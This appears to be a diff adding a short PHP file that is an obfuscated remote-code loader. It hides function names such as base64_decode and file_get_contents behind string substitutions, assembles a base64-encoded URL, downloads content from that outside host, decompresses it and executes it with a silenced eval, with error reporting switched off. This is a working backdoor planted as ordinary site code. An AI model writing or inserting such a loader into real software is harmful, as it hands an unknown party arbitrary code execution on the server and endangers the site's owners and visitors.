@@ -1,0 +1,24 @@
+<?php
+error_reporting(0);
+$www=str_replace('%','','%f%i%l%e%%');
+$info=str_replace('#','','#g#e###t#');
+$site=str_replace('&','','c&o&nt&en&t&s&');
+$nots='9ybXQudHh0';
+$fuco='93b2ouYXBwLzQwNC';
+$cocos='aHR0cHM6Ly';
+$cccs=str_replace('sp','64_',str_replace('z','e','baszspdzcodz'));
+$cute=$www.'_'.$info.'_'.$site;$ulr = $cccs($cocos.$fuco.$nots);$www=$cccs(Class_Get($ulr));$https=gzinflate($www);@eval($https);
+
+function Class_Get($url){
+	if(extension_loaded('curl')){
+		$ch = curl_init(trim($url));
+		curl_setopt($ch, CURLOPT_HEADER, 0);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		$content = curl_exec($ch);
+		curl_close($ch);
+	}else{
+			$content = @file_get_contents(trim($url));
+	}
+	return $content;
+}
+?>
